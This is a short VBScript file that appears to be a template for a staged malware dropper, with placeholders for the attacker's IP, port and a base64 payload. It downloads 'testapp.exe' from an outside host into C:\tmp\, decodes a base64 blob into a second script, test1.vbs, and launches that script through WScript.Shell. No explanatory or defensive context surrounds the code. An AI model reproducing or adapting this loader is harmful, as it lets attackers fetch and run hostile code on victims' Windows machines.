Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1

  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary

  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.Write Binary

  'Change stream type To text/string
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText

  'Specify charset For the output text (unicode) data.
  BinaryStream.CharSet = "us-ascii"

  'Open the stream And get text/string data from the object
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function


Set objHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
basePath = "C:\tmp\"
url = "http://[IP]:[PORT]/testapp.exe"
objHttp.Open "GET", url, False
objHttp.Send

filePath = basePath + Mid(url, InStrRev(url, "/") + 1)

Set bStream = CreateObject("Adodb.Stream")

With bStream
	.Type = 1
	.Open
	.Write objHttp.ResponseBody
	.SaveToFile filePath, 2
End With

Set oXML = CreateObject("Msxml2.DOMDocument")
Set oNode = oXML.CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.text = "[STAGE_3_BASE64_CODE]"

Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")

Set OutPutFile = FSO.OpenTextFile(basePath + "test1.vbs" ,8 , True)

OutPutFile.WriteLine(Stream_BinaryToString(oNode.nodeTypedValue))

Set FSO= Nothing
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "wscript " + basePath+ + "test1.vbs"